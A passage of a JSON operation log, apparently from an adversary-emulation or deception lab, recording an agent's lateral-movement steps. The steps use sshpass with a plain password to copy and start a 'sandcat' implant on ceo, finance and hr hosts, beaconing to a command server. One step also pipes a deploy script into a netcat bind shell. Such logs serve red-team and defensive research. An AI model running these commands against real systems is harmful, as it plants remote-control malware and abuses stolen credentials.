"host.lateralMove.passwordubuntu", "created": "2023-10-03T20:14:25Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "finance", "unique": "host.lateralMove.userfinance", "created": "2023-10-03T20:14:25Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.lateralMove.ip192.168.200.5", "created": "2023-10-03T20:14:25Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-03T20:14:25Z", "relationships": []}], "unique": "cd3ab914-de57-4906-88d9-f4caefff034f", "decide": "2023-10-03T20:14:25Z", "status": 124, "score": 15, "pid": "1807", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:14:26Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux finance@192.168.200.5:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 finance@192.168.200.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["cd3ab914-de57-4906-88d9-f4caefff034f", "8a707ac7-15bf-43ef-aeca-0641adb374f4"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.ip.address192.168.200.5", "created": "2023-10-03T20:14:41Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:14:26Z"}, {"deadman": false, "finish": "2023-10-03T20:14:51Z", "executor": {"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "4d65d058-ab6c-4f8c-85cd-bc5398c34fef", "plaintext_command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.5 4444", "used": [{"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.lateralMove.ip192.168.200.5", "created": "2023-10-03T20:14:45Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "4444", "unique": "host.lateralMove.port4444", "created": "2023-10-03T20:14:45Z", "relationships": []}], "unique": "4d65d058-ab6c-4f8c-85cd-bc5398c34fef", "decide": "2023-10-03T20:14:45Z", "status": 1, "score": 3, "pid": "1811", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ncshell", "executors": [{"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T9090", "name": "Deception download agent on target through netcat bind shell", "description": "download sandcat agent on a target machine that is listening on a netcat bind shell", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: Netcat Bind Shell"}, "agent_reported_time": "2023-10-03T20:14:46Z", "command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.5 4444", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:14:46Z"}, {"deadman": false, "finish": "2023-10-03T20:14:58Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "8a707ac7-15bf-43ef-aeca-0641adb374f4", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux finance@192.168.200.5:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 finance@192.168.200.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:14:56Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "finance", "unique": "host.lateralMove.userfinance", "created": "2023-10-03T20:14:56Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.lateralMove.ip192.168.200.5", "created": "2023-10-03T20:14:56Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-03T20:14:56Z", "relationships": []}], "unique": "8a707ac7-15bf-43ef-aeca-0641adb374f4", "decide": "2023-10-03T20:14:56Z", "status": 1, "score": 15, "pid": "1815", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:14:58Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux finance@192.168.200.5:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 finance@192.168.200.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["cd3ab914-de57-4906-88d9-f4caefff034f", "8a707ac7-15bf-43ef-aeca-0641adb374f4"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.ip.address192.168.200.5", "created": "2023-10-03T20:14:41Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:14:58Z"}, {"deadman": false, "finish": "2023-10-03T20:15:08Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "83875978-af4f-445c-997d-088987dec0f7", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:15:01Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ceo", "unique": "host.lateralMove.userceo", "created": "2023-10-03T20:15:01Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.lateralMove.ip192.168.200.4", "created": "2023-10-03T20:15:01Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-03T20:15:01Z", "relationships": []}], "unique": "83875978-af4f-445c-997d-088987dec0f7", "decide": "2023-10-03T20:15:01Z", "status": 0, "score": 15, "pid": "1819", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:15:07Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["83875978-af4f-445c-997d-088987dec0f7", "7ba8d606-7366-4833-8b1f-5f5a23cf7db0"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.ip.address192.168.200.4", "created": "2023-10-03T20:15:08Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:15:07Z"}, {"deadman": false, "finish": "2023-10-03T20:15:30Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "7ba8d606-7366-4833-8b1f-5f5a23cf7db0", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:15:11Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ceo", "unique": "host.lateralMove.userceo", "created": "2023-10-03T20:15:11Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.lateralMove.ip192.168.200.4", "created": "2023-10-03T20:15:11Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-03T20:15:11Z", "relationships": []}], "unique": "7ba8d606-7366-4833-8b1f-5f5a23cf7db0", "decide": "2023-10-03T20:15:11Z", "status": 124, "score": 15, "pid": "1841", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:15:15Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["83875978-af4f-445c-997d-088987dec0f7", "7ba8d606-7366-4833-8b1f-5f5a23cf7db0"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.ip.address192.168.200.4", "created": "2023-10-03T20:15:08Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:15:15Z"}, {"deadman": false, "finish": "2023-10-03T20:15:34Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "11abc713-2c45-4581-a036-6720741de263", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:15:31Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "hr", "unique": "host.lateralMove.userhr", "created": "2023-10-03T20:15:31Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.lateralMove.ip192.168.200.6", "created": "2023-10-03T20:15:31Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-03T20:15:31Z", "relationships": []}], "unique": "11abc713-2c45-4581-a036-6720741de263", "decide": "2023-10-03T20:15:31Z", "status": 1, "score": 15, "pid": "2384", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:15:34Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["11abc713-2c45-4581-a036-6720741de263", "303a7504-bfa3-465e-a1d6-2e588d293e4e"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.ip.address192.168.200.6", "created": "2023-10-03T20:15:34Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:15:34Z"}, {"deadman": false, "finish": "2023-10-03T20:15:53Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "303a7504-bfa3-465e-a1d6-2e588d293e4e", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:15:36Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "hr", "unique": "host.lateralMove.userhr", "created": "2023-10-03T20:15:36Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.lateralMove.ip192.168.200.6", "created": "2023-10-03T20:15:36Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-03T20:15:36Z", "relationships": []}], "unique": "303a7504-bfa3-465e-a1d6-2e588d293e4e", "decide": "2023-10-03T20:15:36Z", "status": 124, "score": 15, "pid": "2449", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, 